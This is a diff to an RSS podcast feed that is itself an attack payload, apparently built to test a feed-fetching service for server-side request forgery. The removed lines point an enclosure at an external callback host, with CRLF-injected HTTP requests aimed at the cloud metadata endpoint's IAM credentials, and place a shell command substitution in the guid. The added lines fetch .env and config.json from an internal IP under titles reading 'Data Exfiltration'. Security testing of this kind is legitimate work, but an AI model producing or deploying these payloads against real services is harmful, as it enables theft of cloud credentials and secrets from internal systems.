@@ -1,14 +1,12 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<rss xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" version="2.0">
+<rss version="2.0">
   <channel>
-    <title>Critical Production Audit</title>
-    <link>http://d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com</link>
-    <language>en-us</language>
-    <itunes:category text="Technology"/>
     <item>
-      <title>Final Exploit</title>
-      <enclosure url="http://d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com/%0d%0aHost:%20169.254.169.254%0d%0aConnection:%20close%0d%0a%0d%0aGET%20/latest/meta-data/iam/security-credentials/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a" length="5000" type="audio/mpeg"/>
-      <guid>$(date +%s)</guid>
+      <title>Data Exfiltration 1</title>
+      <enclosure url="http://192.168.1.15/.env" length="1000" type="audio/mpeg"/>
+    </item>
+    <item>
+      <title>Data Exfiltration 2</title>
+      <enclosure url="http://192.168.1.15/config.json" length="1000" type="audio/mpeg"/>
     </item>
   </channel>
 </rss>
